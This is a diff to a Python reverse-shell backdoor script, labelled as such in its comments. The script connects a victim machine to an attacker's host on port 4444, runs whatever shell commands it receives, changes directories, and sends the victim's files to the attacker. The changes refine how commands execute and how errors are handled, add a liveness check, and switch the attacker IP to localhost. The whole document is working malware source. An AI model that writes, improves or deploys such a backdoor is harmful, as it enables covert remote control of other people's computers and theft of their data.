@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 # Author: Yiğit Şık 06/11/2021
 
 # This script will establish the reverse shell connection between attacker and victim machine
@@ -24,10 +25,10 @@ class Backdoor:
 
     # Execute given command string in shell
     def execute_system_command(self, command):
-        try:
-            return subprocess.check_output(command, shell=True).decode()
-        except subprocess.CalledProcessError:
-            return "Subprocess Error! Check Your Command"
+        command_result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+        output_byte = command_result.stdout.read() + command_result.stderr.read()
+        output_str = output_byte.decode()
+        return output_str
 
     # Send Messages as Json format for data integrity purposes
     # Sending data plainly might cause problems because end of the data stream cannot be known
@@ -65,8 +66,10 @@ class Backdoor:
 
     # Here we are waiting commands from attacker machine in an infinite loop
     def run(self):
-        command_result = ""
+
         while True:
+
+            command_result = ""
 
             # Wait (This is a blocking code) command string from attacker
             command = self.receive_data()
@@ -77,13 +80,14 @@ class Backdoor:
                 exit()
 
             # Change the directory. The default is where this script resides
-            elif command[0] == "cd" and len(command) > 1:
+            elif command[0] == "cd":
                 try:
-                    command_result = self.change_working_directory_to(command[1])
-                except FileNotFoundError:
-                    self.send_data("Cannot find the path specified")
-                except Exception:
-                    self.send_data("Syntax is incorrect")
+                    if len(command) > 1:
+                        command_result = self.change_working_directory_to(command[1])
+                    else:
+                        command_result = self.execute_system_command(command[0])
+                except Exception as e:
+                    self.send_data(e)
 
             # Send files from victim to attacker
             elif command[0] == "download":
@@ -99,14 +103,18 @@ class Backdoor:
                 except FileNotFoundError:
                     self.send_data("Cannot find the file specified")
 
+            elif command == 'AreYouAwake?':
+                self.send_data("Yes")
+
             # Execute other builtin commands
             else:
                 command_result = self.execute_system_command(command)
 
             # Send results of commands executed to the attacker
-            self.send_data(command_result)
+            if len(command_result) > 0:
+                self.send_data(command_result)
 
 
 # Connect to the attacker's computer
-my_backdoor = Backdoor("192.168.79.128", 4444)
+my_backdoor = Backdoor("127.0.0.1", 4444)
 my_backdoor.run()
